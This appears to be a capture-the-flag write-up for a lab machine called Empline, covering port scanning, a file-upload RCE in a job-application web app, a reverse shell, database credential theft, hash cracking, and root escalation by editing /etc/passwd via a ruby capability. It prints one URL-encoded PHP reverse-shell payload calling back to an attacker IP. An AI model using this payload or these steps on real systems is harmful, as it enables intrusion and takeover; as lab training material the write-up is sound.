Empline

Target IP: 10.10.79.50

Are you good enough to apply for this job?

Scanning


There are three TCP ports open on the target machine: SSH, HTTP, and MySQL.

Enumeration

Port 80: HTTP


The webpage above is displayed for this web application.


The source-code of this webpage contains another VHOST.


I appended the VHOST names www.job.empline.thm job.empline.thm empline.thm inside /etc/hosts file. Time for enumeration now.


I did not find anything useful at the main webpage. However, the job.empline.thm is interesting. The webpage above is displayed for this VHOST.


There is one job ad posted as shown above. There are three interesting parameters highlighted in yellow above. I used the Apply to Position button and applied using fake data, but that did not lead to anything useful. I wonder if it is possible to upload a malicious document.


From directory search, I found the login portal that shows the version of this application which is 0.9.4.


I found a working exploit for this application on Github. Apparently it is vulnerable to RCE due to not properly validating file uploads for job ads.

Exploitation


After running the exploit against the target machine, I got a hit! Time to upgrade this to a full reverse shell connection.


Now I have a reverse shell connection. Since the target machine is already using PHP, I used a PHP reverse shell script to obtain a reverse shell connection on port 8443. In the picture above, I deployed the PHP payload (from below) using the exploit in the top terminal. And the bottom terminal is where I obtain the reverse shell connection on port 8443. Now I have a foothold on the target machine.
PHP payload used: php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.

Privilege Escalation


The config.php contains the credential above.


Using the credential from above, I gained access to the MySQL application on the target machine. There is an interesting database called opencats. This database contains a table called user which contains the entries above.


I copied the three MD5 password hashes to a file called passwords. Then I used john to crack the hashes. I only obtained the password pretonnevippasempre for one hash, which could possibly belong to the user george as he is a user of the system.


And bingo! The password pretonnevippasempre belongs to the user george. Now I escalated my privileges to the user george.


Looks like the ruby binary has change owner permission capabilities set. I can change the owner of /etc/passwd file, so I can change the content of it. Maybe I can create a user with root privileges?


I changed the owner and permissions of the /etc/passwd file. Now as a the user george, I can modify it! I generated a new password root using openssl passwd.


And I added a new user called rooted with root privileges. Then I switched to this new root user. Now I have a root shell. And that's a wrap!
